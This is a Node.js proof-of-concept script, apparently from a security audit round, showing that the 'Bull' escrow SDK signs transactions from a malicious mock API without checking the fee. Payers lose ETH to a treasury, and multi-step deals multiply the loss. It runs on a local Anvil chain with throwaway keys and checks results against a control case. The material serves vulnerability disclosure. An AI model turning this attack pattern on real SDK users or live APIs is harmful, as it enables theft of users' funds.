// MAJOR 26-A — Team A. Live SDK (sha f450d44d…, 54.263 B, snapshot
// live-api-round26-a, byte-identical to Minor 5) + Agreement v4.1 etched
// zerofee on fresh Anvil 4663. Real SDK verbatim + mock API.
// Throwaway local (anvil) keys only. No live POSTs, no real funds.
// Usage: node run-sdk-fee.mjs <mode>   (fresh Anvil per run, port 8548)
//   k2122 : agree() USDG 500, honest attest-by-arbiter condition, server
//           returns feeWei = 0.05 ETH (the full #agreeCap) + tx value
//           0.05 ETH. Expect: SDK SENDS with NO error (check() never
//           looks at feeWei/value); agreement created; TREASURY +0.05 ETH;
//           payer ETH -0.05; attest + release still pay payee +500 USDG.
//   k2122c: CONTROL honest feeWei=0, value=0 — SDK sends, treasury +0.
//   k2122d: deal("milestones", 2) USDG 500, server returns feeWei=0.05 ETH
//           + value 0.05 ETH on EACH of the 2 createAgreement steps.
//           Expect: SDK sends both; TREASURY +0.10 ETH total — the cap
//           applies PER STEP, so a multi-step deal multiplies the drain.
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  createPublicClient, createWalletClient, http as vhttp, defineChain,
  parseAbi, encodeFunctionData, encodeAbiParameters, erc20Abi,
  keccak256, toHex,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { Bull } from "./sdk-live.mjs";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)));
const RPC = "http://127.0.0.1:8548";
const API_PORT = 3007;
const AGREEMENT = "0x7AB58fAAe65eFCF0037635382cAA546EaC233DA6";
const USDG = "0x5fc5360D0400a0Fd4f2af552ADD042D716F1d168";
const TREASURY = "0x1B3b7abb6553a1bbc9B285E6ab3F2012e88e4d5f";
const ZERO = "0x0000000000000000000000000000000000000000";

const chain = defineChain({ id: 4663, name: "Robinhood Chain",
  nativeCurrency: { decimals: 18, name: "ETH", symbol: "ETH" },
  rpcUrls: { default: { http: [RPC] } } });
const victimKey = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";
const arbiterKey = "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d";
const attackerKey = "0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a";
const victim = privateKeyToAccount(victimKey);
const arbiter = privateKeyToAccount(arbiterKey);
const attacker = privateKeyToAccount(attackerKey);
const V = victim.address, ARB = arbiter.address, A = attacker.address;

const publicClient = createPublicClient({ chain, transport: vhttp(RPC) });
const walletV = createWalletClient({ chain, transport: vhttp(RPC), account: victim });
const walletR = createWalletClient({ chain, transport: vhttp(RPC), account: arbiter });
const walletA = createWalletClient({ chain, transport: vhttp(RPC), account: attacker });
const wall = () => Math.floor(Date.now() / 1000);

const AGR_ABI = parseAbi([
  "function createAgreement((address payee,address asset,uint256 amount,uint64 expiry,bytes32 termsHash,(uint8 kind,address target,bytes data,uint256 value)[] conditions) p,(uint256 feeWei,uint64 expiry,bytes sig) q) payable returns (uint256)",
  "function attest(uint256 id,uint256 index) returns (bool)",
  "function release(uint256 id) returns (bool)",
]);
const approveCall = (spender, amt) => encodeFunctionData({ abi: erc20Abi, functionName: "approve", args: [spender, amt] });
const tx = (to, data, value = "0") => ({ to, data, value });
const bal = (token, who) => publicClient.readContract({ address: token, abi: erc20Abi, functionName: "balanceOf", args: [who] });
const ethBal = (who) => publicClient.getBalance({ address: who });
const zero32 = "0x" + "00".repeat(32);
const termsHashOf = (terms) => (terms ? keccak256(toHex(String(terms))) : zero32);
const FEE_CAP = 50000000000000000n; // 0.05 ETH — the full #agreeCap for ERC-20

async function rpc(method, params) {
  const r = await fetch(RPC, { method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) });
  const j = await r.json(); if (j.error) throw new Error(method + ": " + JSON.stringify(j.error)); return j.result;
}
const toHex32 = (n) => "0x" + BigInt(n).toString(16).padStart(64, "0");
const current = { mode: "k2122" };

function mkAgr(payee, asset, amount, expiry, termsHash, conds, feeWei) {
  return encodeFunctionData({ abi: AGR_ABI, functionName: "createAgreement",
    args: [{ payee, asset, amount, expiry: BigInt(expiry), termsHash, conditions: conds },
           { feeWei: BigInt(feeWei), expiry: BigInt(wall() + 3600), sig: "0x" + "00".repeat(65) }] });
}

const server = http.createServer(async (req, res) => {
  const body = await new Promise((r) => { let d = ""; req.on("data", (c) => (d += c)); req.on("end", () => r(d)); });
  const send = (o) => { res.writeHead(200, { "content-type": "application/json" }); res.end(JSON.stringify(o)); };
  if (req.url === "/api/v1/agreements" && req.method === "POST") {
    const p = JSON.parse(body || "{}");
    const w = wall();
    const amt500 = 500n * 10n ** 6n;
    const expiry = BigInt(w + Math.round(Number(p.expiryHours || 72) * 3600));
    const th = termsHashOf(p.terms);
    const mode = current.mode;
    const approve = (token, amt) => ({ transaction: tx(token, approveCall(AGREEMENT, amt)) });
    let steps = [];
    if (mode === "k2122") { // fee inflated to the full cap
      steps = [approve(USDG, amt500),
        { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500, expiry, th, [{ kind: 1, target: ARB, data: "0x", value: 0n }], FEE_CAP), FEE_CAP.toString()) }];
    } else if (mode === "k2122c") { // CONTROL honest fee 0
      steps = [approve(USDG, amt500),
        { transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500, expiry, th, [{ kind: 1, target: ARB, data: "0x", value: 0n }], 0n), "0") }];
    }
    return send({ steps });
  }
  if (req.url === "/api/v1/templates" && req.method === "POST") {
    const p = JSON.parse(body || "{}");
    const w = wall();
    const amt500 = 500n * 10n ** 6n;
    const th = termsHashOf(p.terms);
    const mode = current.mode;
    const approve = (token, amt) => ({ transaction: tx(token, approveCall(AGREEMENT, amt)) });
    let steps = [];
    if (mode === "k2122d") { // milestones x2, fee 0.05 ETH on EACH step
      const n = 2;
      for (let i = 0; i < n; i++) {
        const ex = BigInt(w + Math.max(72, 168 * (i + 1)) * 3600);
        steps.push(approve(USDG, amt500 / BigInt(n)));
        steps.push({ transaction: tx(AGREEMENT, mkAgr(A, USDG, amt500 / BigInt(n), ex, th, [{ kind: 1, target: ARB, data: "0x", value: 0n }], FEE_CAP), FEE_CAP.toString()) });
      }
    }
    return send({ steps });
  }
  res.writeHead(404); res.end("{}");
});

async function tryCall(wallet, fn, id, idx = 0n) {
  try { await wallet.writeContract({ address: AGREEMENT, abi: AGR_ABI, functionName: fn, args: (fn === "attest") ? [BigInt(id), idx] : [BigInt(id)] }); return true; }
  catch { return false; }
}
const usdg = (x) => (BigInt(x) / 10n ** 6n).toString();

async function setup() {
  await new Promise((r) => server.listen(API_PORT, r));
  const agrZero = "0x" + fs.readFileSync(path.join(ROOT, "chain/bytecode/agreement-v41-zerofee.hex"), "utf8").trim().replace(/^0x/, "");
  await rpc("anvil_setCode", [AGREEMENT, agrZero]);
  await rpc("anvil_setStorageAt", [AGREEMENT, "0x0", toHex32(1n)]);
  await rpc("anvil_setStorageAt", [AGREEMENT, "0xb", toHex32(1n)]);
  const mocks = JSON.parse(fs.readFileSync(path.join(ROOT, "mocks/MockERC20.json"), "utf8"));
  const hash = await walletV.deployContract({ abi: mocks.abi, bytecode: mocks.bytecode.object, args: [] });
  const addr = (await publicClient.waitForTransactionReceipt({ hash })).contractAddress;
  const code = await publicClient.getCode({ address: addr });
  await rpc("anvil_setCode", [USDG, code]);
  await rpc("anvil_setStorageAt", [USDG, "0x2", toHex32(6n)]);
  await walletV.writeContract({ address: USDG, abi: mocks.abi, functionName: "mint", args: [V, 500000n * 10n ** 6n] });
}

async function main() {
  const mode = process.argv[2] || "k2122";
  current.mode = mode;
  await setup();
  const bull = new Bull({ walletClient: walletV, publicClient, baseUrl: `http://127.0.0.1:${API_PORT}` });
  const results = [];
  const push = (o) => { results.push(o); console.log(`[${o.case}]`, JSON.stringify(o)); };

  if (mode === "k2122" || mode === "k2122c") {
    const honest = mode === "k2122c";
    const tBefore = await ethBal(TREASURY);
    const vEthBefore = await ethBal(V);
    const payeeBefore = await bal(USDG, A);
    let id = null, err = "";
    try { id = await bull.agree({ payee: A, asset: "usdg", amount: "500", terms: "Deliver the report", expiryHours: 72, conditions: [{ type: "attest", by: ARB }] }); }
    catch (e) { err = String(e.message || e); }
    const sent = !!id;
    const tAfter = await ethBal(TREASURY);
    const vEthAfter = await ethBal(V);
    let att = false, rel = false;
    if (sent) {
      att = await tryCall(walletR, "attest", id);
      rel = await tryCall(walletA, "release", id);
    }
    const payeeAfter = await bal(USDG, A);
    push({ case: honest ? "K-2122c CONTROL agree() honest fee 0" : "K-2122 agree() feeWei inflated to 0.05 ETH cap",
      sdkSent: sent, sdkThrew: err.slice(0, 300), agreementId: id ? String(id) : null,
      treasuryGainedEthWei: (tAfter - tBefore).toString(),
      treasuryGainedEth: Number(tAfter - tBefore) / 1e18,
      payerEthSpentWei: (vEthBefore - vEthAfter).toString(),
      arbiterAttested: att, releasedAfterAttest: rel, payeeGainedUsdg: usdg(payeeAfter - payeeBefore),
      exploited: sent && !honest && (tAfter - tBefore) === FEE_CAP && rel && (payeeAfter - payeeBefore) === 500n * 10n ** 6n,
      controlClean: sent && honest && (tAfter - tBefore) === 0n });
  }
  if (mode === "k2122d") {
    const tBefore = await ethBal(TREASURY);
    let ids = null, err = "";
    try { ids = await bull.deal("milestones", { payee: A, asset: "usdg", amount: "500", terms: "Deliver the report", arbiter: ARB, milestones: 2, stepHours: 168 }); }
    catch (e) { err = String(e.message || e); }
    const sent = !!ids;
    const tAfter = await ethBal(TREASURY);
    push({ case: "K-2122d deal(milestones,2) feeWei 0.05 ETH on EACH step",
      sdkSent: sent, sdkThrew: err.slice(0, 300), agreementIds: ids,
      treasuryGainedEthWei: (tAfter - tBefore).toString(),
      treasuryGainedEth: Number(tAfter - tBefore) / 1e18,
      exploited: sent && (tAfter - tBefore) === 2n * FEE_CAP });
  }
  console.log(JSON.stringify(results, null, 2));
  fs.writeFileSync(path.join(ROOT, `node-result-${mode}.json`), JSON.stringify({ mode, sdk: "f450d44df1812a6b9254c7b8cbac8aab89e94301cb86727f439643dfad47efae", agreement: "v4.1-0x7AB58fAAe65eFCF0037635382cAA546EaC233DA6", results }, null, 2));
  server.close();
  process.exit(0);
}
main().catch((e) => { console.error("RUNNER FATAL", e); server.close(); process.exit(2); });
